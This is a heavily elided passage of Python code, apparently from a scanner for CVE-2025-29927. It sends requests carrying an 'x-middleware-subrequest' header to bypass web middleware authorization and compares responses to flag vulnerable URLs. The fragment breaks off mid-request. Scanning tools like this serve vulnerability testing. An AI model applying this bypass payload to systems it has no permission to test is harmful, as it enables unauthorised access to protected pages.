    ...
    for middleware_name in middleware_names:
        ...
        try:
            ...
            if (
                ...
                print(
                    f" {Identify.confirmed} | CVE-2025-29927 {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | \033[34m{url_p}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}"
                )
        ...
        if req_cb.status_code in [307, 308, 304, 301, 302]:
            for middleware_name in middleware_names:
                ...
                if req_cp.status_code not in [307, 308, 304, 301, 302]:
                    print(
                        f" {Identify.behavior} | CVE-2025-29927 {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}"
                    )
                    for _ in range(0, 5):
                        requests.get(
                            url_cp,
